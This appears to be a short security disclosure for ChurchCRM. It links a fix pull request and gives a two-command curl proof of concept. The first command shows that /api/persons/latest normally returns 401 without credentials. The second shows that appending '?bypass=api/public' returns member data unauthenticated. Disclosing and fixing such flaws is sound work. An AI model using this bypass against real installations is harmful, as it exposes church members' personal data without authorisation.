Fix PR: https://github.com/ChurchCRM/CRM/pull/7376

Minimal PoC (demonstrates auth bypass):
### unauthenticated (expected HTTP/401)
curl -i 'https://<target>/api/persons/latest'

### bypass by adding query parameter (returns HTTP/200 and member data)
curl -i 'https://<target>/api/persons/latest?bypass=api/public'
